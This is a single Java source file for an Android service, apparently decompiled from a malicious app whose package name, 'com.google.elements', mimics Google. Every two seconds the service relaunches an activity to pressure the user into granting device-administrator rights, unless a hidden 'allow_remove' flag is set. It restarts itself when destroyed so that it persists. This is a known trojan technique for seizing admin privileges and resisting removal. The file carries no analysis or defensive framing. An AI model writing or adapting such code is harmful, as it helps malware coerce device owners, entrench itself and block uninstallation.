package com.google.elements;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.IBinder;
import java.util.Timer;
import java.util.TimerTask;

public class AdminService extends Service {
    public void onCreate() {
        new Timer().schedule(new TimerTask() {
            public void run() {
                AdminService adminService = AdminService.this;
                AdminService.this.getApplicationContext();
                if (!((DevicePolicyManager) adminService.getSystemService("device_policy")).isAdminActive(new ComponentName(AdminService.this.getApplication(), DeviceAdmin.class)) && !Utils.getInstance(AdminService.this.getApplicationContext()).Settings().getBoolean("allow_remove", false)) {
                    Intent admin_activity = new Intent(AdminService.this.getBaseContext(), AdminActivity.class);
                    admin_activity.addFlags(1417674752);
                    AdminService.this.getApplication().startActivity(admin_activity);
                }
            }
        }, 0, 2000);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        return 1;
    }

    public void onDestroy() {
        Intent service = new Intent(getApplicationContext(), AdminService.class);
        service.setFlags(268435456);
        startService(service);
    }
}
